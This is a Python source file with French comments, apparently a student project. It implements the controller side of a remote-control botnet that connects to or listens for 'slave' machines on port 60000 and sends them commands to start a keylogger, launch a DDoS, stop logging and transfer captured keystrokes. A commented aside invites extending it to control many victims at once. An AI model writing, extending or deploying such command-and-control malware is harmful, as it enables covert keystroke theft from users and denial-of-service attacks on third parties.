#importation du module socket afin de permetttre une communication réseau
#importation  d'argparse afin de pouvoir créer des argument
import socket as modSocket
import argparse

"""
création de l'objet communication
avec le champ machineEsclave.
Création de 2 méthodes connexion et argument

connexion() va permettre d'établire une connexion avec
une machine esclave
dans le try: on essaiera d'établire une connexion
avec une machine distante.
le except: va print "erreur" si il n'y a pas eu de
connexion

"""
class Communication():

    def __init__(self, machineEsclave, s, listeAdresseIP):
        self.machineEsclave = machineEsclave
        self.s = s
        self.listeAdresseIP = listeAdresseIP

    def connexion(self, s, listeAdresseIP):
        
        try:
            print(listeAdresseIP)
            if len(listeAdresseIP) != 0:
                for adresse in listeAdresseIP:
                    machineEsclave = (adresse, 60000)
                    s.connect(machineEsclave)
                    print("Connecion établi avec l'esclave")
            else:
                print("On ne connait pas de machine esclave")
        except ConnectionRefusedError:
            print("Erreur de connexion")

    def ecoute(self, s, listeAdresseIP):
        s.bind(("", 60000))
        s.listen()
        print("j'attend que les slave se connecte")
        distanSocket, addr = s.accept()
        distanSocket.recv(1024).decode("utf-8")
        listeAdresseIP.append(addr[0])
        print(listeAdresseIP)
        return listeAdresseIP

"""
création de l'objet ChoixAction
avec le champ machineEsclave et s.

machineEsclave, va contenire l'adresse et le port sur lequel on va essayer de se connecter.
(petit défi pour toi. Si tu veux, essaye de faire en sorte que machineEsclave soit une liste avec plusieurs IP(differents esclaves)
et fais une boucle qui va permettre de se connecter a tous ces clients. )
s va contenire les infos sur le type de communication ect ...

Création de pusieurs methodes afin de choisir l'action a faire
sur le slave.
Ils vont tous avoir la même action a faire c'est à dire envoyer un message au client
pour activer une action.
"""

class ChoixAction(Communication):

    def __init__(self, machineEsclave):
        self.machineEsclave = machineEsclave
        self.s = s
    
    def start_log(self, s):
        print("Choix d'attaque : Keylogger. Signal envoyé")
        #envoie keylogger au client 
        s.send("keylogger".encode("utf-8"))
        #reçois directement sa réponse
        print(s.recv(1024).decode("utf-8"))

    def ddos(self, s):
        #idem
        print("Choix d'attaque : DDoS. Signal envoyé")
        s.send("ddos".encode("utf-8"))
        print(s.recv(1024).decode("utf-8"))
    
    def stop_log(self, s):
        #idem
        print("Choix d'attaque : stop keylogger. Signal envoyé")
        s.send("stop".encode("utf-8"))
        print(s.recv(1024).decode("utf-8"))
    
    def  get_log(self, s):
        #idem
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        s.send("transfert".encode("utf-8"))
        print(s.recv(1024).decode("utf-8"))
        
    
#on initie s et machineEsclave
listeAdresseIP = []
machineEsclave = ("localhost", 5000)
s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
#on assigne l'objet choixAction qui est l'enfant de l'objet Communication à la variable a
a = ChoixAction(machineEsclave)
#on lance la methode connexion de l'objet communication
select1 = int(input("1)connecte \n2)ecoute \nSélectionnez une option : "))
if select1 == 1:
    a.connexion(s, listeAdresseIP)
elif select1 == 2:
    a.ecoute(s, listeAdresseIP)


"""
#petit choix multiple afin de savoir quelle methode on doit lancer
select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
while select != 5:
    #on essaie le choix multiple
    try:
        if select == 1:
            #lance la methode ddos de l'objet choixAction
            a.ddos(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        elif select == 2:
            #lance la methode start de l'objet choixAction
            a.start_log(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        elif select == 3:
            #lance la methode stop de l'objet choixAction
            a.stop_log(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        elif select == 4:
            #lance la methode get de l'objet choixAction
            a.get_log(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))

    #si la connexion est arretée par le client pendant le choix multiple, il affichera le message ci dessous
    except ConnectionAbortedError:
        print("connexion arretée par le client")
"""

"""
Pour rendre le code plus cool ont pourrait rajouter des arguments grace
au module argparse, on essaiera de mettre ça en place pour afficher par exemple les adresse avec
lesquels il sera connecter ect .......
À voir ce n'est pas urgent

"""

s.close()



    




